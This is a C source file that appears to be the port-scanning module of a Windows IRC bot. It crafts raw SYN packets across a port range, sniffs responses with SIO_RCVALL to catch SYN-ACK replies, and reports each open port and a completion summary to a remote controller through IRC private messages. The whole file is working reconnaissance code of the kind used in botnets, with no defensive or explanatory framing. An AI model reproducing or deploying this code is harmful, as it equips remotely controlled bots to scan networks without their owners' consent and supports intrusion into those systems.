#include "include.h"
#include "extern.h"

int pcount;
extern unsigned short s_port;

void pscan_portopen(unsigned long ip, unsigned short port)
/* send SYN packet to ip */
{
	int flag = 1;
	int sin_len = sizeof(struct sockaddr);
	unsigned long src_ip = inet_addr(local_ip);
	struct sockaddr_in sin;
	struct tcpp p;
	SOCKET sock;
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1)
		return;
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&flag, sizeof(flag)) == -1)
		return;
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	sin.sin_addr.s_addr = ip;
	memset(sin.sin_zero, 0, 8);
	makesyn(&p, src_ip, ip, s_port, port);
	sendto(sock, (char *)&p, sizeof(p), 0, (struct sockaddr *)&sin, sizeof(sin));
	closesocket(sock);
}

DWORD WINAPI pscan_start(void *param)
/* main pscan function (scan multiple ports on a single host) */
{
	unsigned short port;
	struct in_addr in;
	struct pscans pscan = *(struct pscans *)param;
	struct pscans *ppscan = (struct pscans *)param;
	ppscan->gotinfo = true;
	srand(GetTickCount());
	thread[pscan.tnum].scan = true;
	pcount = 0;
	s_port = rrand(2000, 60000);
	pscan.lgotinfo = false;
	if(!CreateThread(0, 131072, pscan_listen, &pscan, 0, 0))
		ExitThread(0);
	while(!pscan.lgotinfo)
		Sleep(10);
	for(port = pscan.startp; port <= pscan.endp; port++)
	{
		pscan_portopen(pscan.ip, port);
		Sleep(pscan.delay);
	}
	in.s_addr = pscan.ip;
	irc_privmsg(pscan.target, "pscan on %s complete, found %d open ports", inet_ntoa(in), pcount);
	clearthread(pscan.tnum);
	ExitThread(0);
return 0;
}

DWORD WINAPI pscan_listen(void *param)
/* listen for raw packets and process them */
{
	char buf[65535];
	unsigned long mode = 1;
	struct sockaddr_in sin;
	struct in_addr in;
	struct ip_hdr *iph;
	struct tcp_hdr *tcph;
	struct pscans pscan = *(struct pscans *)param;
	struct pscans *ppscan = (struct pscans *)param;
	SOCKET sock;
	ppscan->lgotinfo = true;
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) == -1)
		ExitThread(0);
	sin.sin_family = AF_INET;
	sin.sin_port = 0;
	sin.sin_addr.s_addr = inet_addr(local_ip);
	memset(sin.sin_zero, 0, 8);
	if(bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
	{
		closesocket(sock);
		ExitThread(0);
	}
	if(ioctlsocket(sock, SIO_RCVALL, &mode) == -1)
	{
		closesocket(sock);
		ExitThread(0);
	}
	while(scan_active)
	{
		if(recv(sock, buf, sizeof(buf), 0) <= 0)
		{
			closesocket(sock);
			ExitThread(0);
		}
		iph = (struct ip_hdr *)buf;
		if(iph->ip_p != IPPROTO_TCP)
			continue;
		tcph = (struct tcp_hdr *)(buf + sizeof(struct ip_hdr));
		if(tcph->th_flags == (SYN | ACK))
		{
			if(ntohs(tcph->th_dport) == s_port)
			{
				if(iph->ip_src == pscan.ip)
				{
					pcount++;
					in.s_addr = iph->ip_src;
					irc_privmsg(pscan.target, "port %hu open on %s", ntohs(tcph->th_sport), inet_ntoa(in));
				}
			}
		}
	}
	closesocket(sock);
	ExitThread(0);
return 0;
}